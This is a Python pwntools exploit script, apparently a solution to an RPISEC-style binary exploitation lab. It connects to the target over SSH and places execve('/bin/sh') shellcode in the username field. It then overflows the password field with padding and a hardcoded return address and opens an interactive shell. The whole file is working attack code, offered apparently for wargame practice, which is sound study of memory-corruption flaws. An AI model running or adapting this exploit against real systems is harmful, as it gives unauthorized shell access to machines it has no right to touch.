#!/usr/bin/python
import sys
from pwn import *

def connect_remote(username, password, host, file):
    s = ssh(host=host, user=username, password=password)
    if not s.connected():
        print "[!] Couldn't connect on remote host (\"%s\")" % (host)
        sys.exit(1)
    return s.process(file)

def process_local():
    pass

def asm_instructions():
    instructions = [
        'xor ecx, ecx',
        'mul ecx',
        'mov ebx, 0xb7f83a24',  # Pointer to "/bin/sh" (found with peda)
        'mov al, SYS_execve',
        'int 0x80'
    ]
    return instructions

if __name__ == "__main__":
    p = connect_remote("", "", "", "")
    print "PID: %d" % (p.pid)

    ADDR = 0x8049c46
    shell = ''.join(map(asm, asm_instructions()))
    username = "rpisec" + shell
    password = "admin" + "A"*75 + struct.pack("<I", ADDR)

    p.sendline(username)
    p.sendline(password)
    p.interactive()
